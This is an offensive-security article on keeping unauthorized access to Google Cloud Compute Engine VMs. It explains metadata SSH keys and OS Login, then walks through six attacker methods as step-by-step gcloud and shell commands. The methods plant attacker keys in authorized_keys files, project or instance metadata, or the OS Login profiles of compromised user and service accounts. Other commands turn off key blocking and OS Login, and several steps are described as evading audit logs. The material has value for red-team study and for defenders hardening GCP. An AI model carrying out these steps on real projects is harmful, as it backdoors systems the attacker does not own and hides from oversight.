SSH (Secure Shell) has long been the de facto standard for secure remote access to UNIX-based systems. Traditionally, SSH relies on key-based authentication, where a user's Public Key is stored on the server, and the corresponding Private Key is held by the user. When the user attempts to connect, the server challenges the user to prove they have the corresponding Private Key, ensuring a secure handshake.

However, as cloud computing evolved and infrastructure scaled to unprecedented levels, managing individual SSH keys for each user and each server became a daunting task. The traditional method of manually placing Public keys in the ~/.ssh/authorized_keys file of each server was no longer feasible for large-scale deployments. There was a need for a more scalable, centralized, and automated solution.

Google Cloud Platform (GCP) came up with its innovative approach to SSH key management. Traditional SSH methods relied on individual VM configurations, which could become cumbersome and challenging to manage at scale. Recognizing these challenges, GCP introduced a centralized system, allowing for more streamlined, efficient, and secure management of SSH keys, irrespective of the number of VMs in operation. This centralized system is built upon the concept of metadata, which serves as a repository for configuration data, including SSH keys.

## Metadata: The Centralized Configuration Store

In GCP, metadata provides a unified way to store and retrieve configuration information without having to access the VM directly. This not only simplifies the management process but also enhances security by reducing direct interactions with the VMs.

Within this metadata framework, GCP offers two distinct levels:

- **Project Metadata**: This is a shared configuration space, where data can be stored and made accessible to every VM within that specific project. Among other things, both Project and Instance metadata can include Public SSH keys. When these keys are added to Project Metadata, GCP automatically populates them into the ~/.ssh/authorized_keys file of every VM instance within that project. This ensures consistent access controls across all instances in a project. It's a powerful tool for administrators who want to maintain consistent configurations across multiple VMs.

- **Instance Metadata**: For more granular control, GCP provides instance-specific metadata. This allows for VM-specific configurations, ensuring that particular settings or data are confined to a single VM, without affecting others in the project. If an SSH key is added to an instance's metadata, it will be populated into that specific VM's ~/.ssh/authorized_keys file. This is particularly useful for instances that require different access controls than the broader project.

> **Usecase**: Consider a scenario where a project contains multiple VMs - some for development and testing, while others for production. The development team needs access to all VMs for updates and debugging, so their keys are added to the project metadata. However, a third-party auditor requires access only to a specific production VM to review system logs. In this case, the auditor's key would be added to the instance-specific metadata of that particular VM, ensuring restricted access.

By leveraging these metadata levels, GCP offers a flexible and robust system that caters to both broad and specific configuration needs, ensuring that VMs are both accessible and secure.

One of the features GCP offers is the "**Block project-wide SSH keys**" option, which can be enabled at Instance Level not Project Level. When enabled for a specific VM instance, this feature ensures that only keys specified in the Instance Metadata can be used to access that VM, overriding any keys specified at the Project level. This provides an additional layer of granularity and control, allowing administrators to set specific access controls for individual VMs.

However, GCP's innovations in the realm of SSH access don't end with metadata. As the cloud ecosystem evolved and security demands intensified, there was need for even more sophisticated access controls, this is where Google introduced OS Login.

## OS Login - A Modern Approach

**OS Login** is a feature that seamlessly integrates SSH key management with Google Cloud Identity. This integration offers a dynamic and fortified method for managing SSH access. OS Login can be enabled at both Project and Instance Level. When OS Login is activated (by setting *enable-oslogin* to *TRUE*) the conventional practice of utilizing the ~/.ssh/authorized_keys file for SSH key storage is sidestepped. If OS Login is activated at the Project Level (by setting *enable-oslogin* to *TRUE*), it becomes the default for all VMs in that project. However, this can be overridden by setting the environment variable "*enable-oslogin*" to "*FALSE*" at the Instance level to disable OS Login.

The beauty of OS Login lies in its ability to directly link SSH keys with user or service accounts in GCP, thereby introducing an added layer of identity verification to the SSH authentication process.

Below is a attached Image which expalain the overall process discussed above.

![1](https://drive.google.com/uc?id=17zLXP9Y91QunzEBuU6LdNC4o7pMB4Z8k)

# Persisting in Compute Engine VMs with "Block project-wide SSH keys" configurations 

![2](https://drive.google.com/uc?id=1tQlyvvaqqb6gyIm0Ht_7pzFmEQxEVaQ6)

In the Image above, there are three methods listed attackers can use to Persist in a Environment with "Block Project-wide SSH Keys" Enabled / Disabled. The three methods are discussed in detail below. The goal of all the three methods is to directly or indirectly add the attacker generated Public SSH Key(s) to the ~/.ssh/authorized_keys file in Instance

Once the attacker has successfully added the Public SSH Key(s) to the ~/.ssh/authorized_keys file in Instance, they can use the corresponding Private Key to SSH into the VM from anywhere, without needing to authenticate with GCP again. This is why it's considered a form of persistence; the attacker has essentially created a backdoor for themselves.

The attacker can disable "Block Project-wide SSH Key" option but we are avoiding that. This research focuses on operating in an environment with such restrictions enabled.

- Disable "Block Project-wide SSH Key" for a specific instance

    ```powershell
    gcloud compute instances add-metadata [INSTANCE_NAME] --zone=[ZONE] --metadata=block-project-ssh-keys=FALSE
    ```

### Method 1: Attacker Logs into the VM directly and adds Public Key(s) to be able to login later or persist.

**Scenario:** The Attacker has successfully gained access to the VM (let's say instance-1) through some vulnerability, misconfiguration or even legitimate means and now wants to maintain the access / persist.

**Steps:**

1. In Attackers machine, the attacker generates SSH Public and Private Key pair with a random email.

    ```powershell
    ssh-keygen -t rsa -b 4096 -C "USERNAME@example.com"
    ```

    This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.

2. While logged in to the target instance, attacker appends their Public SSH Key to the authorized_keys file.

    ```powershell
    echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
    ```

3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..

    ```powershell
    ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
    ```

**Note:**

- This method is direct and hands-on. The Attacker is manually adding their SSH key to the VM, bypassing GCP's key management mechanisms.
- The "Block project-wide SSH keys" option have no effect on this method. This is because the Attacker isn't relying on GCP to propagate or manage the SSH key. They're adding it directly to the ~/.ssh/authorized_keys file.
- Evades GCP-level logging associated with key additions, making their actions less visible in the platform's audit trails.
- Leaves no trace of the added key in either the Instance or Project Metadata.

### Method 2: Attacker adds the Public Key(s) to the Project Metadata.

**Scenario:** The Attacker has gained access to the GCP environment and noticed the "Block project-wide SSH keys" option is disabled for the target VM(s).

**Steps:**

1. In Attackers machine, the attacker generates SSH Public and Private Key pair with a random email.

    ```powershell
    ssh-keygen -t rsa -b 4096 -C "USERNAME@example.com"
    ```

    This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.

2. Add the Public SSH key to the Project-wide Metadata.

    ```powershell
    gcloud compute project-info add-metadata --metadata-from-file ssh-keys=~/.ssh/id_rsa.pub
    ```

3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..

    ```powershell
    ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
    ```

**Note:**

- This key will be automatically added to the authorized_keys file of every VM in the project that have the "Block project-wide SSH keys" option disabled.
- The "Block project-wide SSH keys" option can have effect on this method. If the option is enabled GCP won't propagate the SSH key to the VM's ~/.ssh/authorized_keys file.
- Key additions in the Project Metadata is logged in the platform's audit trails.

### Method 3: Attacker adds the Public Key(s) to the Instance Metadata.

**Scenario:** The Attacker has gained access to the GCP environment and noticed the "Block project-wide SSH keys" option is enabled for the target VM(s).

**Steps:**

1. In Attackers machine, the attacker generates SSH Public and Private Key pair with a random email.

    ```powershell
    ssh-keygen -t rsa -b 4096 -C "USERNAME@example.com"
    ```

    This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.

2. Add the Public SSH key to the Instance metadata of the VM.

    ```powershell
    gcloud compute instances add-metadata INSTANCE_NAME --metadata-from-file ssh-keys=~/.ssh/id_rsa.pub
    ```
    
3. The Attacker can now login to the Instance without needing to authenticate to GCP or have access to a valid User / Service Account..

    ```powershell
    ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
    ```

**Note:**

- The "Block project-wide SSH keys" option doesn't have effect on this method. Regardless of the option enabled or disabled, the key added to the Instance metadata will be added to the VM's ~/.ssh/authorized_keys file.
- Key additions in the Project Metadata is logged in the platform's audit trails.

# Persisting in Compute Engine VMs with OS Login Enabled

![3](https://drive.google.com/uc?id=1BtgN1rPOh9wHA5SU-uFauv6a9NnB1pRi)

OS Login provides a more dynamic and secure method of handling SSH access, tying SSH keys directly to user or service accounts in GCP. This integration not only streamlines access management but also adds an additional layer of identity verification to the SSH process.

However, like any technology, while it's designed to enhance security, it can also be a double-edged sword. In the hands of a savvy attacker, the very mechanisms that are meant to protect can be leveraged for nefarious purposes. 

In the Image above, there are three methods listed attackers can use to Persist in a Environment with OS Login Enabled. The three methods are discussed in detail below. The goal of all the three methods is to associated a attacker generated Public SSH Key with either a user or service account in GCP
 
Once the attacker has successfully associated their SSH public key with either a user or service account in GCP, they can use the corresponding Private Key to SSH into the VM from anywhere, without needing to authenticate with GCP again. This is why it's considered a form of persistence; the attacker has essentially created a backdoor for themselves. 

The attacker can disable "OS Login" from Project or Instance level by setting the environment variable "_enable-oslogin_" to "_FALSE_" and make their operation way easier to carry out, but we are avoiding that. This research focuses on operating in an environment with such restrictions enabled.

- Disable OS Login at the instance level

    ```powershell
    gcloud compute instances add-metadata [INSTANCE_NAME] --zone=[ZONE] --metadata=enable-oslogin=FALSE
    ```

- Disable OS Login at the project level

    ```powershell
    gcloud compute project-info add-metadata --metadata=enable-oslogin=FALSE
    ```

### Method 1: Attacker Logs into the VM (instance-1) directly via certain means, creates .ssh/authorized_keys file in HOME dir. and adds Public Key(s) to be able to login / persist.

**Scenario:** The Attacker has successfully gained access to the VM (let's say instance-1) through some vulnerability, misconfiguration or even legitimate means and now wants to maintain the access / persist.

**Steps:**

1. Generate SSH Public and Private Key pair with a random email.

    ```powershell
    ssh-keygen -t rsa -b 4096 -C "USERNAME@example.com"
    ```

    This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.

2. While logged in to the target instance, attacker creates the ~/.ssh/authorized_keys file in the HOME directory, as it won't be present due to OS Login being enabled for the Instance or Project.

    ```powershell
    cd ~ && mkdir -p .ssh && touch .ssh/authorized_keys
    ```

3. While logged in to the target instance, attacker appends their Public SSH Key to the authorized_keys file.

    ```powershell
    echo "PUBLIC_KEY" >> ~/.ssh/authorized_keys
    ```

4. The Attacker can now login to the Instance from anywhere without needing to authenticate to GCP or have access to a valid User / Service Account.

    ```powershell
    ssh -i ~/.ssh/id_rsa [USERNAME]@[EXTERNAL_IP]
    ```

**Note:**

- This method is direct and hands-on. The Attacker is manually adding their SSH key to the VM, bypassing GCP's key management mechanisms.
- Evades GCP-level logging associated with key additions, making their actions less visible in the platform's audit trails.

### Method 2: Attacker associates the Public Key with Google Cloud User Account.

**Scenario:** The Attacker has successfully gained access to the GCP Environment but notices that OS Login is enabled. The Attacker however has access to a GCP User Account and wants to maintain access by associating their Public Key with the User Account.

**Steps:**

1. Authenticate with Google Cloud:
  
     Attacker uses the gcloud auth login command to authenticate to the compromised user account.
    
    ```powershell
    gcloud auth login
    ```
    
    This will open a browser window log in with the Google Cloud User account credentials.

2. Generate SSH Public and Private Key pair for Google Cloud User.

    ```powershell
    ssh-keygen -t rsa -b 4096 -C "USERNAME@DOMAIN.com"
    ```

    This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.

3. Attacker associates the Public Key with a Google Cloud User Account.

    ```powershell
    gcloud compute os-login ssh-keys add --key-file ~/.ssh/id_rsa.pub
    ```

4. To make sure the SSH Keys were associated with the User Account and note the POSIX username:
    
    ```powershell
    gcloud compute os-login describe-profile
    gcloud compute os-login ssh-keys list
    ```

5. Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance without needing to authenticate to GCP or have access to a valid User / Service Account.

    ```powershell
    ssh -i ~/.ssh/id_rsa [POSIX_USERNAME]@[EXTERNAL_IP]
    ```

6. Attacker can revoke the associated Public Key from the Google Cloud User Account if they want:

    ```powershell
    gcloud compute os-login ssh-keys list    
    gcloud compute os-login ssh-keys remove --key [FINGERPRINT]
    ```

**Note:**

- Key association with a User Account is logged in the platform's audit trails.
- The key is associated with a specific user account, making it traceable to that identity.
- If the user account is deleted or suspended, the attacker will lose access.

### Method 3: Attacker associates the Public Key with Google Cloud Service Account.

**Scenario:** The Attacker has successfully gained access to the GCP Environment and notices that OS Login is enabled. The Attacker has access to a GCP Service Account and wants to maintain access by associating their Public Key with the Service Account.

**Steps:**

1. Authenticate with Google Cloud using the Service Account:

    The attacker would need to have the service account's JSON key file.

    ```powershell
    gcloud auth activate-service-account --key-file=/path/to/service-account-key.json
    ```

2. Generate SSH Public and Private Key pair for Google Cloud Service Account:

    ```powershell
    ssh-keygen -t rsa -b 4096 -C "service-account-name@project-id.iam.gserviceaccount.com"
    ```

    This will generate a Private Key `(~/.ssh/id_rsa)` and a Public Key `(~/.ssh/id_rsa.pub)`.

3. Attacker associates the Public Key with a Google Cloud Service Account:

    ```powershell
    gcloud compute os-login ssh-keys add --key-file ~/.ssh/id_rsa.pub
    ```

4. To make sure the SSH Keys were associated with the Service Account and note the POSIX username:

    ```
    powershell
    gcloud compute os-login describe-profile
    gcloud compute os-login ssh-keys list
    ```

5. Attacker Uses the Private Key and the associated POSIX username to SSH into the VM instance without needing to authenticate to GCP or have access to a valid User / Service Account.

    ```powershell
    ssh -i ~/.ssh/id_rsa [POSIX_USERNAME]@[EXTERNAL_IP]
    ```

6. Attacker can revoke the associated Public Key from the Google Cloud Service Account if they want:
    
    ```powershell
    gcloud compute os-login ssh-keys list    
    gcloud compute os-login ssh-keys remove --key [FINGERPRINT]
    ```

**Note:**

- Key association with a Service Account is logged in the platform's audit trails.
- The key is associated with a specific service account, making it traceable to that identity.
- If the service account is deleted or its permissions are modified, the attacker might lose access.
- Service accounts are not meant for direct human access. Associating SSH keys with service accounts is a deviation from best practices and could raise red flags if detected.
